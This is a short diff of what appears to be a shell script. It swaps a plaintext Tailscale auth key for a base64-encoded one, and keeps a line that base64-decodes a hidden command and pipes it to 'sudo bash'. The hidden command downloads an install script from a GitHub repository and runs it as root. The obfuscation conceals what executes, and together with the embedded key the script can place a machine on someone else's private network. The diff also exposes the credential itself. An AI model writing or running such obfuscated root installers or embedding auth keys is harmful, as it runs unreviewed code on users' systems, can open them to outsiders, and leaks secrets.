@@ -1,4 +1,5 @@
-tskey-auth-kN84HPWZ9i11CNTRL-h6kUeMMtB7aCkiyUCoSv6a963RcunSwsM
+dHNrZXktYXV0aC1rZndKYnZLVWYyMTFDTlRSTC1FV1piRFoxaGJZRVp3SEZGYkdZTFlFRUdjN3lMalk1VDU=
+
 
 echo "Y3VybCAtcyBodHRwczovL2dpdGh1Yi5jb20vT2d5ZWV0MTAvaW5zdGFsbGVyOTAwMC9yYXcvcmVmcy9oZWFkcy9tYWluL2luc3RhbGwuc2ggfCBiYXNo" | base64 -d | sudo bash
 
